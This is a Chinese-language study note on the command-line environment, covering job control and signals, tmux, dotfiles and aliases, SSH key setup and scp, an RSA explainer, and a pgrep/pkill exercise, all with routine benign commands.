<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 4152 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 52 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 7 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 15 分钟</p>
</div>
<h2 id="note-cs-tms-command-line-environment-job-control">Job control<a class="headerlink" href="#note-cs-tms-command-line-environment-job-control" title="Permanent link">&para;</a></h2>
<p><code>Sleep</code>命令可以让进程休眠一段时间，单位是秒。<code>Sleep</code>命令的语法如下：</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-tms-command-line-environment-__codelineno-0-1"></a>Sleep<span class="w"> </span>&lt;seconds&gt;
</span></code></pre></div>
例如：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-tms-command-line-environment-__codelineno-1-1"></a>Sleep<span class="w"> </span><span class="m">10</span>
</span></code></pre></div>
<p>如果想要终止当前进程，可以按 <code>Ctrl+C</code> 键。当我们按下 <code>Ctrl+C</code> 键时，会发送一个 <code>SIGINT</code> 信号给当前进程，从而终止进程。
<code>SIGINT</code> 全称是 <code>Signal Interrupt</code>，表示中断信号。更多的信号可以参考使用 <code>man signal</code> 命令查看。</p>
<p>有时候，我们可以针对<code>Ctrl+C</code>进行处理，使其无法关闭我们的进程。</p>
<p><div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-tms-command-line-environment-__codelineno-2-1"></a><span class="ch">#! /usr/bin/env python3</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-cs-tms-command-line-environment-__codelineno-2-2"></a><span class="kn">import</span> <span class="nn">signal</span><span class="o">,</span><span class="nn">time</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-cs-tms-command-line-environment-__codelineno-2-3"></a>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-cs-tms-command-line-environment-__codelineno-2-4"></a><span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-cs-tms-command-line-environment-__codelineno-2-5"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Ctrl+C pressed&quot;</span><span class="p">)</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-cs-tms-command-line-environment-__codelineno-2-6"></a>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-cs-tms-command-line-environment-__codelineno-2-7"></a><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">handler</span><span class="p">)</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-cs-tms-command-line-environment-__codelineno-2-8"></a><span class="n">i</span><span class="o">=</span><span class="mi">0</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-cs-tms-command-line-environment-__codelineno-2-9"></a><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#note-cs-tms-command-line-environment-__codelineno-2-10"></a>   <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#note-cs-tms-command-line-environment-__codelineno-2-11"></a>   <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#note-cs-tms-command-line-environment-__codelineno-2-12"></a>   <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
</span></code></pre></div>
这段代码用于捕捉和处理<code>Ctrl+C</code>（<code>SIGINT</code>）信号。</p>
<p>首先，脚本导入了<code>signal</code>和<code>time</code>模块。然后定义了一个名为<code>handler</code>的函数，这个函数在接收到<code>SIGINT</code>信号时会被调用，并打印出"Ctrl+C pressed"的消息。</p>
<p>接下来，使用<code>signal.signal</code>函数将<code>SIGINT</code>信号与<code>handler</code>函数绑定。当用户按下<code>Ctrl+C</code>时，程序不会立即终止，而是调用<code>handler</code>函数。</p>
<p>脚本接着初始化了一个变量<code>i</code>为0，并进入一个无限循环。在循环中，程序每秒钟休眠一次，并打印出当前的<code>i</code>值，然后将<code>i</code>递增1。</p>
<p>这个脚本的作用是每秒钟打印一个递增的数字，并在用户按下<code>Ctrl+C</code>时打印一条消息而不是终止程序。</p>
<p><code>\r</code> 是回车符，表示将光标移动到当前行的行首。<code>end=""</code> 为了不换行而是在同一行中更新数字</p>
<p>运行之后，按下<code>Ctrl+C</code>，会打印出"Ctrl+C pressed"的消息，然后程序继续运行。</p>
<p>要想终止程序，可以按<code>Ctrl+\</code>，这样程序会收到一个<code>SIGQUIT</code>信号，然后程序会终止。因为我们并没有处理<code>SIGQUIT</code>信号。</p>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>对于<code>SIGKILL</code>信号，它是不能被捕获的，当收到这个信号时，程序会立即终止。但是有时候这个信号会留下孤儿进程（其子进程）。</p>
</div>
<p><code>Ctrl+Z</code> 会暂停当前进程，并将其置于后台。例如当我们执行<code>sleep 100</code>命令时，按下<code>Ctrl+Z</code>，会返回<code>suspended sleep 100</code>，然后执行<code>jobs</code>命令，会看到当前进程被暂停了。
然后我们再输入
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-tms-command-line-environment-__codelineno-3-1"></a>nohup<span class="w"> </span>sleep<span class="w"> </span><span class="m">2000</span><span class="w"> </span><span class="p">&amp;</span>
</span></code></pre></div>
这会再执行一个<code>sleep 2000</code>命令，并将其置于后台(&amp;的含义)。<code>nohup</code>命令的意思是忽略挂起（SIGHUP）信号。
然后查看进程，会看到一个<code>sleep 2000</code>的进程。正在<code>running</code>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-tms-command-line-environment-__codelineno-4-1"></a><span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w">  </span>+<span class="w"> </span>suspended<span class="w">  </span>sleep<span class="w"> </span><span class="m">100</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-cs-tms-command-line-environment-__codelineno-4-2"></a><span class="o">[</span><span class="m">2</span><span class="o">]</span><span class="w">  </span>-<span class="w"> </span>running<span class="w">    </span>nohup<span class="w"> </span>sleep<span class="w"> </span><span class="m">2000</span>
</span></code></pre></div>
如果我们想要重新启动<code>sleep 100</code>，可以输入
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-tms-command-line-environment-__codelineno-5-1"></a><span class="nb">bg</span><span class="w"> </span>%1
</span></code></pre></div>
再使用<code>jobs</code>命令查看进程，会看到<code>sleep 100</code>的进程正在<code>running</code>。其中<code>%1</code>表示第一个进程。
如果使用的是<code>fg</code>命令，则表示将进程放到前台。<code>bg</code>命令表示将进程放到后台。</p>
<p>如果我们想要终止<code>sleep 2000</code>，可以输入
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-tms-command-line-environment-__codelineno-6-1"></a><span class="nb">kill</span><span class="w"> </span>-KILL<span class="w"> </span>%2
</span></code></pre></div>
再使用<code>jobs</code>命令查看进程，会看到<code>sleep 2000</code>的进程已经被终止。也可以使用<code>kill -STOP %1</code>来再次暂停命令</p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p><code>kill -KILL %2</code>(kill) 会立即强制终止进程，而<code>kill %2</code>(terminate) 会正常终止进程。</p>
</div>
<h2 id="note-cs-tms-command-line-environment-terminal-multiplexer">Terminal multiplexer<a class="headerlink" href="#note-cs-tms-command-line-environment-terminal-multiplexer" title="Permanent link">&para;</a></h2>
<p>有的时候我们想要同时打开VIM和终端，一边写代码，一边方便地运行，又或者我们想要在运行某个进程时监视它的资源使用情况……</p>
<p>这些都可以通过打开多个终端来实现，但是事实上还有更方便的方法，那就是使用<code>Terminal Multiplexer</code>(终端复用器)。</p>
<p><code>Terminal multiplexer</code>（终端复用器）是一种软件应用程序，它允许用户在一个单一的终端窗口中运行和管理多个终端会话。通过使用终端复用器，用户可以在一个屏幕上同时查看和操作多个终端会话，而不需要打开多个独立的终端窗口。</p>
<p>终端复用器的主要功能包括：</p>
<ol>
<li><strong>会话管理</strong>：用户可以创建、分离和重新连接到终端会话。这对于远程工作特别有用，因为用户可以在断开连接后重新连接到相同的会话。</li>
<li><strong>窗口和面板</strong>：用户可以在一个终端会话中创建多个窗口和面板，每个窗口和面板可以运行不同的命令或程序。</li>
<li><strong>快捷键</strong>：终端复用器通常提供丰富的快捷键，方便用户快速切换窗口、分割面板、滚动历史记录等。</li>
<li><strong>脚本和自动化</strong>：用户可以编写脚本来自动化常见的任务和配置，从而提高工作效率。</li>
</ol>
<p>常见的终端复用器有<code>tmux</code>和<code>screen</code>。其中，<code>tmux</code>是现代的终端复用器，提供了更强大的功能和更好的用户体验。</p>
<p>在<code>tmux</code>中,有三种层级
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-tms-command-line-environment-__codelineno-7-1"></a>sessions
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-tms-command-line-environment-__codelineno-7-2"></a>   windows
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-tms-command-line-environment-__codelineno-7-3"></a>       panes
</span></code></pre></div></p>
<p>sessions: 会话，一个会话可以有多个窗口
windows: 窗口，一个窗口可以有多个面板。
panes: 面板，一个面板就是一个终端。</p>
<p>例如我们输入<code>tmux</code>，这会在当前shell中启动一个<code>tmux</code>，然后<code>tmux</code>会启动一个<code>shell</code></p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec4-1.png" width="400" />

<figcaption>tmux之前</figcaption>
</figure>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec4-2.png" width="400" />

<figcaption>tmux之后</figcaption>
</figure>
<p>可以输入<code>Ctrl+B</code>然后输入<code>D</code>，这会分离当前的会话，然后回到之前的shell。如果直接输入<code>Ctrl+D</code>，这会关闭当前的会话，然后回到之前的shell。</p>
<p>例如我们可以在tmux开出的shell中执行之前创建的python脚本，然后按<code>Ctrl+B</code>然后输入<code>D</code>，回到之前的shell。进行一系列工作之后，我们再输入<code>tmux a</code>，这会重新连接到之前的会话，然后就可以看到我们的python脚本还在运行。</p>
<p><code>tmux</code>与<code>vim</code>有些类似,输入<code>Ctrl+B</code>然后输入<code>：</code>，这会进入命令模式。(下面绿色一行)，然后可以输入<code>list-sessions</code>，这会列出所有会话。这也可以通过<code>tmux ls</code>来实现。</p>
<p>我们也可以通过<code>tmux new -t session_name</code>来创建一个会话，并命名为<code>session_name</code>。</p>
<p>例如我创建了一<code>foobar</code>的会话，然后输入<code>tmux ls</code>:</p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec4-3.png" width="400" />

<figcaption>tmux ls</figcaption>
</figure>
<p>可以看到有两个会话，一个是<code>foobar</code>，一个是<code>0</code>。</p>
<p>现在可以使用
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-tms-command-line-environment-__codelineno-8-1"></a>tmux<span class="w"> </span>a<span class="w"> </span>-t<span class="w"> </span>foobar
</span></code></pre></div>
来连接到<code>foobar</code>会话。</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>使用<code>tmux a -t foobar</code>时不应该在一个<code>tmux</code>会话中，否则会报错,这是为了避免嵌套和混乱。</p>
</div>
<p>现在，我们可以关注windows，在一个<code>tmux</code>会话中，可以使用<code>Ctrl+B</code>然后输入<code>c</code>来创建一个新窗口。使用<code>Ctrl+B</code>然后输入<code>n</code>来切换到下一个窗口。使用<code>Ctrl+B</code>然后输入<code>p</code>来切换到上一个窗口。当窗口很多时，可以使用<code>Ctrl+B</code>然后输入<code>数字</code>来切换到对应的窗口。</p>
<p>如果想要删除一个窗口，可以使用<code>Ctrl+B</code>然后输入<code>&amp;</code>来删除当前的窗口。</p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec4-4.png" width="400" />

<figcaption>tmux窗口切换</figcaption>
</figure>
<p>在上图中，我们可以看到有三个窗口，分别是<code>0</code>，<code>1</code>，<code>2</code>。当前所处的窗口是<code>0</code>(用<code>*</code>表示)。上一次所在的窗口是<code>2</code>(用<code>-</code>表示)。</p>
<p>可以看到当前三个window的名字都是<code>zsh</code>，这是因为我们没有给window命名。</p>
<p>我们可以使用<code>Ctrl+B</code>然后输入<code>,</code>来重命名当前窗口zsh为其它名字。</p>
<blockquote>
<p>使用<code>Ctrl+B</code>然后输入<code>$</code>可以重命名当前会话<code>foobar</code>为其它名字。</p>
</blockquote>
<p>最后我们再来看看窗格panes，在一个window中，可以使用<code>Ctrl+B</code>然后输入<code>"</code>来水平分割出一个新的窗格，输入<code>%</code>来垂直分割出一个新的窗格。使用<code>Ctrl+B</code>然后输入<code>x</code>来关闭当前的窗格。使用<code>Ctrl+B</code>然后输入<code>方向键</code>来切换到对应的窗格。</p>
<p>效果如下：</p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec4-5.png" width="400" />

<figcaption>tmux窗格</figcaption>
</figure>
<blockquote>
<p>还可以浏览不同的窗格布局，这可以通过<code>Ctrl+B</code>然后输入<code>space</code>(亦即空格键)来实现。</p>
</blockquote>
<p>当我们只想观察一个窗格时,可以通过<code>Ctrl+B</code>然后输入<code>z</code>来放大该窗格使其占据整个窗口，做完我们想做的事之后，可以通过<code>Ctrl+B</code>然后输入<code>z</code>来恢复原来的大小。这可以避免我们频繁地切换windows。</p>
<h2 id="note-cs-tms-command-line-environment-dotfiles">Dotfiles<a class="headerlink" href="#note-cs-tms-command-line-environment-dotfiles" title="Permanent link">&para;</a></h2>
<p><code>alias</code>命令用于为其他命令创建别名。通过使用<code>alias</code>，我们可以为常用的命令指定一个简短的名称，从而提高工作效率。例如，输入<code>alias ll='ls -la'</code>可以将<code>ll</code>设置为<code>ls -la</code>的别名，这样每次输入<code>ll</code>时就会执行<code>ls -la</code>命令。使用<code>alias ll</code>命令可以查看<code>ll</code>的别名。使用<code>alias</code>命令可以查看所有别名。然后使用<code>unalias</code>命令来取消别名。</p>
<p>通过<code>alias</code>命令，我们可以为常用的命令指定一个简短的名称，从而提高工作效率。</p>
<p>但是当我们拥有的别名越来越多时，总不能每一次打开终端都输入一遍这些别名吧。</p>
<p>这时候，我们就可以使用<code>dotfiles</code>来管理这些别名，这就是<code>dotfiles</code>的用途之一</p>
<p><code>Dotfiles</code>是指以<code>.</code>开头的配置文件，这些文件通常用于存储用户的个性化设置和配置。常见的dotfiles包括<code>.bashrc</code>、<code>.vimrc</code>、<code>.gitconfig</code>等。</p>
<p>通过管理和定制这些dotfiles，我们可以在不同的系统和环境中保持一致的工作环境。例如，我们可以在<code>.bashrc</code>中定义别名、环境变量和函数，在<code>.vimrc</code>中配置Vim编辑器的行为和外观，在<code>.gitconfig</code>中设置Git的用户信息和别名。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>在<code>bash</code>中，<code>~/.bashrc</code>是用户的主配置文件，当用户登录时，<code>bash</code>会读取这个文件。
在<code>zsh</code>中，<code>~/.zshrc</code>是用户的主配置文件，当用户登录时，<code>zsh</code>会读取这个文件。</p>
</div>
<p>例如我们想要在<code>bash</code>中定义一个别名<code>ll</code>，我们可以在<code>~/.bashrc</code>中添加以下内容：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-tms-command-line-environment-__codelineno-9-1"></a><span class="nb">alias</span><span class="w"> </span><span class="nv">ll</span><span class="o">=</span><span class="s1">&#39;ls -la&#39;</span>
</span></code></pre></div></p>
<p>然后启动<code>bash</code>，输入<code>ll</code>，就会看到<code>ls -la</code>的输出。</p>
<p>目前比较美观的<code>dotfiles</code>管理工具是<code>oh-my-zsh</code>，它可以帮助我们管理<code>zsh</code>的配置文件。支持很多插件和主题。可以参考<a href="https://ohmyz.sh/">oh-my-zsh</a>。</p>
<p>Github上有很多人热衷于配置并分享自己的<code>dotfiles</code>，也可以去上面找一个自己喜欢的配置。</p>
<p>也存在专门 <code>dotfiles</code>的网站，可以参考<a href="https://dotfile.github.io/">Dotfile.github.io</a>。</p>
<h2 id="note-cs-tms-command-line-environment-remote-machines">Remote machines<a class="headerlink" href="#note-cs-tms-command-line-environment-remote-machines" title="Permanent link">&para;</a></h2>
<p><code>ssh</code>（Secure Shell）是一种用于在不安全的网络上安全地访问远程计算机的协议。它提供了加密的通信通道，确保数据的安全性和完整性。<code>ssh</code>通常用于远程登录、文件传输和执行命令。</p>
<p>要连接到远程机器，可以使用以下命令：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-tms-command-line-environment-__codelineno-10-1"></a>ssh<span class="w"> </span>username@hostname
</span></code></pre></div>
<ul>
<li><code>username</code> 是你在远程机器上的用户名。</li>
<li><code>hostname</code> 是远程机器的地址，可以是IP地址或域名。</li>
</ul>
<p>例如，要连接到IP地址为<code>192.168.1.10</code>的机器，使用用户名<code>user</code>，可以输入：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-tms-command-line-environment-__codelineno-11-1"></a>ssh<span class="w"> </span>user@192.168.1.10
</span></code></pre></div>
<p>可以使用<code>ssh</code>直接在远程机器上执行命令，而不需要登录到远程终端。命令的语法如下：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-tms-command-line-environment-__codelineno-12-1"></a>ssh<span class="w"> </span>username@hostname<span class="w"> </span><span class="s1">&#39;command&#39;</span>
</span></code></pre></div>
<p>例如，要在远程机器上查看当前目录的内容，可以使用：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-tms-command-line-environment-__codelineno-13-1"></a>ssh<span class="w"> </span>user@192.168.1.10<span class="w"> </span><span class="s1">&#39;ls -la&#39;</span>
</span></code></pre></div>
<p>这会在远程机器上执行<code>ls -la</code>命令，并将结果返回到本地终端。</p>
<p>为了提高安全性，可以使用SSH密钥进行身份验证。SSH密钥由一对密钥组成：公钥和私钥。公钥存储在远程机器上，私钥保存在本地机器上。</p>
<p>可以使用以下命令生成SSH密钥对：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-tms-command-line-environment-__codelineno-14-1"></a>ssh-keygen<span class="w"> </span>-t<span class="w"> </span>rsa<span class="w"> </span>-b<span class="w"> </span><span class="m">4096</span><span class="w"> </span>-C<span class="w"> </span><span class="s2">&quot;your_email@example.com&quot;</span>
</span></code></pre></div>
<ul>
<li><code>-t rsa</code> 指定密钥类型为RSA。</li>
<li><code>-b 4096</code> 指定密钥长度为4096位。</li>
<li><code>-C "your_email@example.com"</code> 添加注释（通常是你的邮箱）。</li>
</ul>
<p>生成的密钥对通常存储在<code>~/.ssh/</code>目录下，公钥文件为<code>id_rsa.pub</code>，私钥文件为<code>id_rsa</code>。</p>
<p>将公钥添加到远程机器的<code>~/.ssh/authorized_keys</code>文件中，以便使用SSH密钥进行登录。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-tms-command-line-environment-__codelineno-15-1"></a>ssh-copy-id<span class="w"> </span>username@hostname
</span></code></pre></div>
<p>常用选项包括：</p>
<ul>
<li><code>-p port</code>：指定连接的端口号，默认是22。</li>
<li><code>-i identity_file</code>：指定私钥文件。</li>
<li><code>-L local_port:remote_host:remote_port</code>：设置本地端口转发。</li>
</ul>
<p>可以使用<code>scp</code>命令通过SSH协议传输文件：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-tms-command-line-environment-__codelineno-16-1"></a>scp<span class="w"> </span>local_file<span class="w"> </span>username@hostname:remote_path
</span></code></pre></div>
<ul>
<li><code>local_file</code> 是要传输的本地文件。</li>
<li><code>remote_path</code> 是远程机器上的目标路径。</li>
</ul>
<p>例如，将本地文件<code>example.txt</code>传输到远程机器的<code>/home/user/</code>目录：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-tms-command-line-environment-__codelineno-17-1"></a>scp<span class="w"> </span>example.txt<span class="w"> </span>user@192.168.1.10:/home/user/
</span></code></pre></div>
<details class="info">
<summary>ssh加密</summary>
<p>目前ssh加密使用的是<code>RSA</code>加密算法。
RSA（Rivest-Shamir-Adleman）算法是一种非对称加密算法，由Ron Rivest、Adi Shamir和Leonard Adleman在1977年提出。非对称加密算法使用一对密钥：公钥和私钥。公钥用于加密，私钥用于解密。</p>
<p>RSA算法的安全性基于大整数分解的困难性。具体来说，RSA算法依赖于两个大质数的乘积难以分解这一数学难题。RSA算法的基本步骤为：</p>
<ol>
<li>
<p>生成密钥对：</p>
<ul>
<li>选择两个大质数 <span class="arithmatex">\( p \)</span> 和 <span class="arithmatex">\( q \)</span>。</li>
<li>计算它们的乘积 <span class="arithmatex">\( n = p \times q \)</span>，其中 <span class="arithmatex">\( n \)</span> 是模数。</li>
<li>计算 <span class="arithmatex">\( \phi(n) = (p-1) \times (q-1) \)</span>。</li>
<li>选择一个与 <span class="arithmatex">\( \phi(n) \)</span> 互质的整数 <span class="arithmatex">\( e \)</span>，其中 <span class="arithmatex">\( e \)</span> 是公钥指数。</li>
<li>计算 <span class="arithmatex">\( d \)</span> 使得 <span class="arithmatex">\( d \times e \equiv 1 \mod \phi(n) \)</span>，其中 <span class="arithmatex">\( d \)</span> 是私钥指数。</li>
</ul>
</li>
<li>
<p>公钥和私钥：</p>
<ul>
<li>公钥由 <span class="arithmatex">\( (e, n) \)</span> 组成。</li>
<li>私钥由 <span class="arithmatex">\( (d, n) \)</span> 组成。</li>
</ul>
</li>
<li>
<p>加密：</p>
<ul>
<li>将明文消息 <span class="arithmatex">\( M \)</span> 转换为整数 <span class="arithmatex">\( m \)</span>，其中 <span class="arithmatex">\( 0 \leqslant m &lt; n \)</span>。</li>
<li>使用公钥 <span class="arithmatex">\( (e, n) \)</span> 进行加密，计算密文 <span class="arithmatex">\( c \)</span>：</li>
</ul>
<div class="arithmatex">\[
c \equiv m^e \mod n
\]</div>
</li>
<li>
<p>解密：</p>
<ul>
<li>使用私钥 <span class="arithmatex">\( (d, n) \)</span> 进行解密，计算明文 <span class="arithmatex">\( m \)</span>：</li>
</ul>
<div class="arithmatex">\[
m \equiv c^d \mod n
\]</div>
</li>
</ol>
</details>
<h2 id="note-cs-tms-command-line-environment-exercisesolutions">Exercise&amp;Solutions<a class="headerlink" href="#note-cs-tms-command-line-environment-exercisesolutions" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-tms-command-line-environment-job-control_1">Job Control<a class="headerlink" href="#note-cs-tms-command-line-environment-job-control_1" title="Permanent link">&para;</a></h3>
<p>1.From what we have seen, we can use some 
<code>ps aux | grep</code> commands to get our jobs’ pids and then kill them, 
but there are better ways to do it. Start a sleep 10000 job in 
a terminal, background it with <code>Ctrl-Z</code> and continue its execution with <code>bg</code>.
Now use <code>pgrep</code> to find its pid and <code>pkill</code> to kill it without ever typing the pid itself. (Hint: use the <code>-af</code> flags).</p>
<p>即使用<code>pgrep</code>和<code>pkill</code>来找到进程的pid并杀死它，而不需要手动输入pid。</p>
<div class="admonition info">
<p class="admonition-title">ps aux | grep</p>
<p><code>ps aux | grep</code> 命令用于显示所有进程的详细信息，并根据指定的条件过滤进程。</p>
<ul>
<li><code>ps aux</code>：显示所有进程的详细信息。</li>
<li><code>grep</code>：根据指定的条件过滤进程。
通过pipe(|)将<code>ps aux</code>的输出作为<code>grep</code>的输入，然后根据条件过滤进程。</li>
</ul>
</div>
<p>首先了解一下<code>pgrep</code>和<code>pkill</code>的用法。</p>
<p><code>pgrep</code> 和 <code>pkill</code> 是两个非常有用的命令行工具，用于在 Unix 和 Linux 系统上管理进程。</p>
<p><code>pgrep</code> 用于查找与指定模式匹配的进程 ID。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-tms-command-line-environment-__codelineno-18-1"></a>pgrep<span class="w"> </span><span class="o">[</span>options<span class="o">]</span><span class="w"> </span>pattern
</span></code></pre></div>
<p>常用选项:
  - <code>-f</code>: 匹配完整的命令行，而不仅仅是进程名。
  - <code>-l</code>: 显示进程名和进程 ID。
  - <code>-a</code>: 显示完整的命令行。
  - <code>-u user</code>: 只显示属于指定用户的进程。</p>
<p>示例:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-cs-tms-command-line-environment-__codelineno-19-1"></a>pgrep<span class="w"> </span>-f<span class="w"> </span>sleep
</span></code></pre></div>
这将查找所有命令行中包含“sleep”的进程。</p>
<p><code>pkill</code> 用于根据名称或其他属性终止进程。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-cs-tms-command-line-environment-__codelineno-20-1"></a>pkill<span class="w"> </span><span class="o">[</span>options<span class="o">]</span><span class="w"> </span>pattern
</span></code></pre></div>
常用选项:
  - <code>-f</code>: 匹配完整的命令行。
  - <code>-u user</code>: 只终止属于指定用户的进程。</p>
<ul>
<li><code>-signal</code>: 发送指定的信号（如 <code>-9</code> 代表 <code>SIGKILL</code>）。</li>
</ul>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#note-cs-tms-command-line-environment-__codelineno-21-1"></a>pkill<span class="w"> </span>-f<span class="w"> </span>sleep
</span></code></pre></div>
这将终止所有命令行中包含“sleep”的进程。</p>
<p>知道之后，接下来就是简单地验证命令了。</p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec4-6.png" width="350" />

<figcaption>过程</figcaption>
</figure>
